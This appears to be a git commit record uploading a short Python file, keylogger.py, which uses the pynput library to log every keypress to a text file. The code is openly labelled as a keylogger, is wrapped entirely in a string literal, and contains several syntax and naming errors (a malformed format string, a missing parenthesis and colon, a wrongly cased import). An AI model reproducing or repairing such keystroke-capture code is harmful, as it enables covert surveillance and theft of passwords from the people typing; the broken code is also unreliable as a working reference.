e91262ddff66e478e096f64c03a49eaa8883e223
Abhishek Prasad <abhishek.b.prasad.2003@gmail.com>
2024-09-09 15:33:06 +0530

    Add files via upload

---
+++ keylogger.py
@@ -0,0 +1,18 @@
+'''from pynput.keyboard import key, Listener
+import logging
+
+#make a log
+log_dir = ""
+
+logging.basicConfig(filename=(log_dir+"key_log.txt"), level=logging.DEBUG,  format='%(asctime)s: %(messages )'
+
+
+def on_press(key):
+    logging.info(str(key))
+
+
+
+
+
+with Listener(on_press=on_press) as listener
+    listener.join()'''
